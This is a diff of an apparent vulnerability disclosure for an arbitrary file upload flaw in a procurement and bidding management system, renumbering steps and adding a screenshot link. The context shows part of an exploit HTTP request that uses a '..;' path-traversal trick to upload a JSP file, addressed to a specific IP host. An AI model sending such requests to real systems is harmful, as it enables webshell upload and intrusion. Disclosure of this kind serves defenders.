@@ -11,7 +11,11 @@ There is an arbitrary file upload vulnerability in the procurement and bidding m
 3.Upload a 1. JSP file with the content of test by constructing malicious data packets
 
 ![image](https://github.com/dubin12345/Procurement-and-bidding-management-system/assets/144758348/11ced168-2ef7-4f3d-9162-04446305b6b8)
-4.Vulnerability exploit packets
+4.Accessing uploaded files
+![image](https://github.com/dubin12345/Procurement-and-bidding-management-system/assets/144758348/b2e758ff-5073-4daa-932f-a61fe10d05e5)
+
+
+5.Vulnerability exploit packets
 
 POST //api/..;/commonController.do?parserXml HTTP/1.1
 Host: 219.222.48.58
@@ -34,4 +38,4 @@ test
 ------WebKitFormBoundaryf1BWcBSfJB2Bf4Zm—
 
 
-5.Affected version:=V1.0
+6.Affected version:=V1.0
